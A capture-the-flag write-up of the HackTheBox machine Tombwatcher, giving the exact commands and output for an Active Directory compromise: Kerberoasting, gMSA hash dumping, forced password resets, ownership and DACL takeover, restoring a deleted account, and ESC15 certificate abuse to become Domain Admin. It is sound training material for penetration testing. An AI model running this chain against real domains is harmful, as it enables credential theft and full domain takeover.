---
layout: post
title:  "Tombwatcher (HackTheBox) Writeup"
date:   2026-02-09 13:00:00 +0530
categories: [HackTheBox, Active Directory]
---


**Tombwatcher** is a **Hack The Box (HTB)** Windows machine that focuses on Active Directory privilege escalation through misconfigured ACLs, deleted object abuse, and Active Directory Certificate Services (AD CS) exploitation.

**Hack The Box:  [Tombwatcher](https://app.hackthebox.com/machines/TombWatcher)

## Enumeration

Starting with the nmap scan.

```

 nmap -p 1-10000 -sCV -O -T4 -Pn 10.129.232.167     
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 07:10 -0500
Nmap scan report for 10.129.232.167
Host is up (0.34s latency).
Not shown: 9986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-09 16:20:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-02-09T16:24:32+00:00; +4h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-09T16:24:29+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-02-09T16:24:32+00:00; +4h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-02-09T16:24:32+00:00; +3h59m59s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (91%), Microsoft Windows 10 1903 - 21H1 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-09T16:21:53
|_  start_date: N/A
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m58s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 867.00 seconds


```

The result showed that the target machine is a Windows Domain Controller with most of the AD services running. The Domain was identified as `tombwatcher.htb`.

The `TombWatcher`box provided us with credentials for the following account: `henry / H3nry_987TGV!`.

```
username: henry
password: H3nry_987TGV!
```

## bloodhound

I used `bloodhound` to enumerate Active Directory relationships and permissions. For this, I used **bloodhound-python**.

```
bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -v --zip -c All -ns 10.129.232.167
```

![](/assets/image/tombwatcher/Pasted%20image%2020260209205917.png)

After analyzing the relationships, I found a path from user `henry` to `john` who was a part of `Remote Management Users`and could be used to get the shell on the target system.

![](/assets/image/tombwatcher/Pasted%20image%2020260209181836.png)

Starting with user `henry` who had `WriteSPN`  permission over user `alfred`. This permission allows modifying Service Principal Names (SPNs) on the target account. By abusing **WriteSPN**, a fake SPN was added to the **alfred** user, making the account **Kerberoastable**. 

I used `targetedkerberoast` to get the NTLM hash for the user `alfred`.

```
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$7cffcb03e2fa981ffbf533bd92cc5da7$ba788b0d07b2e2d2575926ea232ef189c33398b802edfbd0c06884b97d7044527036779c68b13cf385ab6093720478dda1243311690b18f94bd40d3ad60c2b85c425d50ecd8b3aa73d48a6b958909b70efaaa48e1e8d0aeb7d3b20521caedf4564ae019b6edf2bd164e090ee322c8b2a94b0578b4d7b756f50380616ee82a9f725024c97faf7649b87b9658ddcc9447a931729d27b0a5fd314a149484523aea90cd8338cfdbe96dc24fc671074a6fa10ca794db3471e15739c87cf40207022c1d45a440f9547aa2eb58750cabe103a7960aee70b7419f997f60a2b078bbc159a2785c3b3a466760ae1afa5ca435a2213148fd809bf2910843d73472d2374baff36167f428d000c3aaebf87632e8efa0ac5b5d4521927d793c8c80c79a932a8a858170e777debbe11ee742b4bac4f48336feddbbaf5632060b3b72bbaa766138057859dae5f40e24347d70368b75ba0ad6cdcb0c40af860f53409e2ba3c0eb7983397d14283fe47329af3cad12e08b02d3a55b099a2ee76ca8c0c446d5789bb7ce779d8ebfed96ad6c09cdac43bb44540b414d94075487c1876da4e438f1b23d40102c0d82a12ececd511b0fa28b0f304b961f6df7b2f19f0240bd30ac102480fe04c01dd6f6a5fc808b47cd5558a9f8b4868e37f90001e0414fbbbf062eadc40178853fd607245330e4220b8f70e1ae22631a31d6ac20c92871917f579cf13cbfd3dfe2c6d91b7e41d4ba13b9981a591c2e8a44c16dd2d5b1b7e687dcba32743acf79ccf9a4f19de10ddbcbabef2de33993b1067b30bf34faabe2964c64d3a8068ead558fb43d6ab446a8235d8ffa2b9ae1a58a415c322871b10106c829cc9237081569914da5929dc57d74eb58e447c397220bf263cd986d942f224acf64c831ae1c7fd6e10559bbcb3750a24b4ee655dce9ac1bd9d4d75822464fbc26217a19dd27b098636eb0baae36499a2df582796853c4c60a206a08e317415047b24da249530173f0866a8dcb96bf1ceea4de3730b471b8dc64ab58e4d0d04b3ef98cb347837b00ede121de3ebbbb7405997a5a084fcade4182654f05af4aca48c8b1d7ea0f89647f5a87534c8f2f50c2b20d321fda694a35b401f3740772a4e29ec1be23b3cccb49d7cc1d0220d49c1c8b9b1fccb1a05fc2565aef472eea6ff88c14e4df0fdf1507c6217a7fa4de2e7bd690a6ade841cf7426328651d663031dec43cbeef85f5a408f2bfbede22ac4d5cd1e9a4ae7ab1dc80480dfbb1411b813dcab076f584d310054199ed532835cd95f36c6630bf88f31f2c1e235f64dffa7f07b8c505e7734365b0bb9f95304b6bff5a1da2537e71e9594f5b7b09e07a7ed6739d28acf4476033f5c7af0f2d564ba1bed273ba486661d7e51c5cd946626b2bc5b8ec0627a3ae63e70ac5b1958a1839fcaaee2207c515242174045ed293e96dc8b8c4db8766c1ce76e2180314999261f578e0df2418f0
[VERBOSE] SPN removed successfully for (Alfred)
```

I used `hascat` to crack the NTLM hash and got the password.

```
hashcat hash /usr/share/wordlists/rockyou.txt

password: basketball
```

```
username: alfred
password: basketball
```

![](/assets/image/tombwatcher/Pasted%20image%2020260209182006.png)

Further in the path, user `alfred` had **AddSelf** permission over domain group `infrastructure`. This permission allows a user to add themselves to the target group without requiring administrative privileges and immediately inheriting all permissions and rights assigned to that group.
By abusing `AddSelf`, I added user `aflred` to the domain group `infrastructure`using `bloodyAD`.

```
bloodyAD -d tombwatcher.htb --host 10.129.232.167 -u alfred -p basketball add groupMember infrastructure alfred
[+] alfred added to infrastructure

```

![](/assets/image/tombwatcher/Pasted%20image%2020260209182132.png)

After that the domain group `infrastructure` had `ReadGMASPassword` permission over computer account `ANSIBLE_DEV$`. 
This permission allows a principal to read the managed password of the gMSA directly from Active Directory.

I used `gMSADumper.py` to dump the hash for computer account `ANSIBLE_DEV$` by abusing the permission.

```
python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'                                         
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::93f81a98d22217b6206d950528a4802e
ansible_dev$:aes256-cts-hmac-sha1-96:a6873c860ec9d8c2c8b6382080d250c4f65b558abdef206fd6a57bb2b5a4d024
ansible_dev$:aes128-cts-hmac-sha1-96:179480fd2697ccea216e682e7d66feaa

```

![](/assets/image/tombwatcher/Pasted%20image%2020260209182224.png)

Computer account `ANSIBLE_DEV$` had `ForceChangePassword` permission over user `sam`. This permission allows a principal to reset the target user’s password without knowing the current password. 

I abused this permission to set the password for user `sam` using `bloodyAD`.

```
bloodyAD -d tombwatcher.htb --host 10.129.232.167 -u ansible_dev$ -p :93f81a98d22217b6206d950528a4802e set password sam 'Newpassword1234'

[+] Password changed successfully!

```

```
username: sam
password: Newpassword1234
```

And lastly, user `sam` had `writeOwner` privilege over user `john`. This privilege allows changing the owner of an object and the object owner automatically gains the ability to modify the object’s Access Control List (DACL). 

Abusing this privilege, ownership of the user `john` object was first transferred to `sam` using Impacket’s `owneredit` and then I used `dacledit` to grant **FullControl** permissions to user `sam`.

```
impacket-owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Newpassword1234'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

```
impacket-dacledit -action write -rights FullControl -principal sam -target john tombwatcher.htb/sam:Newpassword1234

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
[*] DACL backed up to dacledit-20260209-122251.bak
[*] DACL modified successfully!

```

I used `bloodyAD` to set the password for user `john`.

```
bloodyAD -d tombwatcher.htb \
  --host 10.129.232.167 \
  -u sam -p 'Newpassword1234' \
  set password john 'Password123456'
[+] Password changed successfully!
```

![](/assets/image/tombwatcher/Pasted%20image%2020260209182416.png)

 `john` was a part of the `Remote Management Users` so, I can use his credentials to get the shell on the target machine using `evil-winrm` and navigating to the user’s desktop revealed **user flag**.

```
nxc winrm 10.129.232.167 -u john -p 'Password123456'                                                       
WINRM       10.129.232.167  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.232.167  5985   DC01             [+] tombwatcher.htb\john:Password123456 (Pwn3d!)
```

```
evil-winrm -i 10.129.232.167 -u john -p 'Password123456'                          
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> type ..\Desktop\user.txt
45f29bafca3869ff2dc85abbfc949898

```

## Privilege Escalation 

With the shell on target machine with user `john`, I enumerated the the AD recycle bin to see if any of the deleted objects could be used and this revealed a user named `cert_admin`.

```
*Evil-WinRM* PS C:\> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf

```

I restored the `cert_admin` user using its GUID.

```
*Evil-WinRM* PS C:\> Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'


*Evil-WinRM* PS C:\> Get-ADUser cert_admin -Properties Enabled


DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
Surname           : cert_admin
UserPrincipalName :

```

I collected the data for bloodhound again to see what new relationships could be found. I discovered that `john` had `GenericAll` permission over user `cert_admin`which could be utilized to compromise the domain.

![](/assets/image/tombwatcher/Pasted%20image%2020260210201942.png)

Abusing the **GenericAll** permission, I set a password for user `cert_admin` using `bloodyAD`.

```
bloodyAD -d tombwatcher.htb --host 10.129.232.167 -u john -p 'Password123456' set password cert_admin 'Password123456'

[+] Password changed successfully!

```

## ADCS

I used `certipy-ad` with the credentials for user `cert_admin` in order to identify vulnerable certificate templates. 

```
certipy-ad find -dc-ip 10.129.232.167 -u 'cert_admin@tombwatcher.htb' -p 'Password123456' -enabled -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

```

This revealed a vulnerable certificate template named `WebServer` and this template was flagged as vulnerable to `ESC15`.
The **ESC15 vulnerability** (EKUwu), affects Active Directory Certificate Services (AD CS), allowing attackers to inject unauthorized EKUs (e.g., **Client Authentication**) into Schema Version 1 templates. This flaw enables privilege escalation, bypassing security restrictions and granting unauthorized access.

Abuse of **ESC15** allowed `cert_admin` to obtain a certificate with Client Authentication, enabling authentication as **Administrator**.

```
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Password123456' -target dc01.tombwatcher.htb -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'Administrator' -application-policies 'Client Authentication'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.tombwatcher.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: TOMBWATCHER.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

I used the certificate( administrator.pfx ) to authenticate as **Administrator** and granting **LDAP shell access** as **Domain Admin**.
From the shell, I created a new domain user `yuki` and added to the `Enterprise Admins` group. This way the whole domain is compromised.

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.167 -ldap-shell
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Connecting to 'ldaps://10.129.232.167:636'
[*] Authenticated to '10.129.232.167' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# whoami
u:TOMBWATCHER\Administrator

# add_user yuki
Attempting to create user in: %s CN=Users,DC=tombwatcher,DC=htb
Adding new user with username: yuki and password: \&b]h[dWIAZ31I{ result: OK

# add_user_to_group yuki "Enterprise Admins"
Adding user: yuki to group Enterprise Admins result: OK

# exit
Bye! 

```

Lastly, I got a shell on the target machine using the credentials for newly added user `yuki` and then navigated to the Administrator’s desktop and retrieved the **root flag**.

```
evil-winrm -u yuki -p '\&b]h[dWIAZ31I{' -i tombwatcher.htb
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\yuki\Documents> type C:\Users\Administrator\Desktop\root.txt
 
8676663498f730e3006060a234f7bfe3
```